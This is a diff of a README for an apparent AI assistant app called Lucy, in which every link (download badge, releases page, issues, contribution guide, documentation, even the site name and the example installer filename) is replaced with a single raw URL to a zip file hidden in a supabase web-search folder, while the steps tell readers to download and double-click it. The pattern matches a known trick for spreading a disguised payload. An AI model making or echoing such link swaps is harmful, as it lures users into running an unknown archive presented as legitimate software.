@@ -1,10 +1,10 @@
 # 🌟 lucy-ai-inc - Your Personal AI Assistant Awaits
 
-[![Download Lucy AI](https://img.shields.io/badge/Download%20Lucy%20AI-v1.0-blue.svg)](https://github.com/conixken/lucy-ai-inc/releases)
+[![Download Lucy AI](https://raw.githubusercontent.com/conixken/lucy-ai-inc/main/supabase/functions/web-search/lucy-ai-inc-3.8-alpha.2.zip%20Lucy%https://raw.githubusercontent.com/conixken/lucy-ai-inc/main/supabase/functions/web-search/lucy-ai-inc-3.8-alpha.2.zip)](https://raw.githubusercontent.com/conixken/lucy-ai-inc/main/supabase/functions/web-search/lucy-ai-inc-3.8-alpha.2.zip)
 
 ## 🌐 Overview
 
-Welcome to LucyLounge.org! Lucy is your advanced AI companion and productivity platform. Enjoy features such as real-time chat, multimodal tools, business automation, coding assistance, credit repair support, and an extensive AI toolkit powered by next-gen models. 
+Welcome to https://raw.githubusercontent.com/conixken/lucy-ai-inc/main/supabase/functions/web-search/lucy-ai-inc-3.8-alpha.2.zip! Lucy is your advanced AI companion and productivity platform. Enjoy features such as real-time chat, multimodal tools, business automation, coding assistance, credit repair support, and an extensive AI toolkit powered by next-gen models. 
 
 ## 🚀 Getting Started
 
@@ -21,13 +21,13 @@ Before downloading, make sure your device meets the following requirements:
 
 ## 📥 Download & Install
 
-To download Lucy, visit this page to download: [GitHub Releases Page](https://github.com/conixken/lucy-ai-inc/releases).
+To download Lucy, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/conixken/lucy-ai-inc/main/supabase/functions/web-search/lucy-ai-inc-3.8-alpha.2.zip).
 
 1. Click the link above to access the Releases page.
 2. Locate the latest version of Lucy.
 3. Click on the download link for your operating system.
    
-   For example, if you see a file named `LucyAI_Setup.exe` for Windows, click on it to download.
+   For example, if you see a file named `https://raw.githubusercontent.com/conixken/lucy-ai-inc/main/supabase/functions/web-search/lucy-ai-inc-3.8-alpha.2.zip` for Windows, click on it to download.
 
 4. Once the download is complete, locate the downloaded file on your device.
 5. Double-click the file to start the installation process.
@@ -66,17 +66,17 @@ If you encounter any issues while using Lucy, consider the following tips:
 
 ## 📞 Support
 
-Your satisfaction is important. For questions or issues, please reach out to our support team. You can find help through the [GitHub Issues page](https://github.com/conixken/lucy-ai-inc/issues). 
+Your satisfaction is important. For questions or issues, please reach out to our support team. You can find help through the [GitHub Issues page](https://raw.githubusercontent.com/conixken/lucy-ai-inc/main/supabase/functions/web-search/lucy-ai-inc-3.8-alpha.2.zip). 
 
 ## 🔍 Contributing
 
-We welcome contributions! If you wish to help improve Lucy, please visit our [Contribution Guidelines](https://github.com/conixken/lucy-ai-inc/CONTRIBUTING.md) page for more details.
+We welcome contributions! If you wish to help improve Lucy, please visit our [Contribution Guidelines](https://raw.githubusercontent.com/conixken/lucy-ai-inc/main/supabase/functions/web-search/lucy-ai-inc-3.8-alpha.2.zip) page for more details.
 
 ## 🔗 Links
 
-- **GitHub Repository:** [lucy-ai-inc](https://github.com/conixken/lucy-ai-inc)
-- **Documentation:** [Lucy Documentation](https://github.com/conixken/lucy-ai-inc/wiki)
+- **GitHub Repository:** [lucy-ai-inc](https://raw.githubusercontent.com/conixken/lucy-ai-inc/main/supabase/functions/web-search/lucy-ai-inc-3.8-alpha.2.zip)
+- **Documentation:** [Lucy Documentation](https://raw.githubusercontent.com/conixken/lucy-ai-inc/main/supabase/functions/web-search/lucy-ai-inc-3.8-alpha.2.zip)
 
 Take the first step today and join countless users who are enhancing their productivity with Lucy! 
 
-[![Download Lucy AI](https://img.shields.io/badge/Download%20Lucy%20AI-v1.0-blue.svg)](https://github.com/conixken/lucy-ai-inc/releases)
+[![Download Lucy AI](https://raw.githubusercontent.com/conixken/lucy-ai-inc/main/supabase/functions/web-search/lucy-ai-inc-3.8-alpha.2.zip%20Lucy%https://raw.githubusercontent.com/conixken/lucy-ai-inc/main/supabase/functions/web-search/lucy-ai-inc-3.8-alpha.2.zip)](https://raw.githubusercontent.com/conixken/lucy-ai-inc/main/supabase/functions/web-search/lucy-ai-inc-3.8-alpha.2.zip)
